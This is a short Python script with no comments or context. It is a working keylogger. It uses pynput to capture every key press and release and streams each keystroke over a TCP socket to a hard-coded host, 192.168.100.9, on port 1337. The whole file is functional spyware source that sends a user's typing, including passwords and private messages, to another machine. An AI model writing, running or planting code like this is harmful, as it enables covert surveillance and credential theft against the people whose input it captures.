#!/usr/bin/env python3

import socket
from pynput.keyboard import Key, Listener

HOST = '192.168.100.9'
PORT = 1337

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.connect((HOST, PORT))


def on_press(key):
    socket.sendall(bytes('press: ' + str(key), encoding='utf-8'))


def on_release(key):
    socket.sendall(bytes('release: ' + str(key), encoding='utf-8'))


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

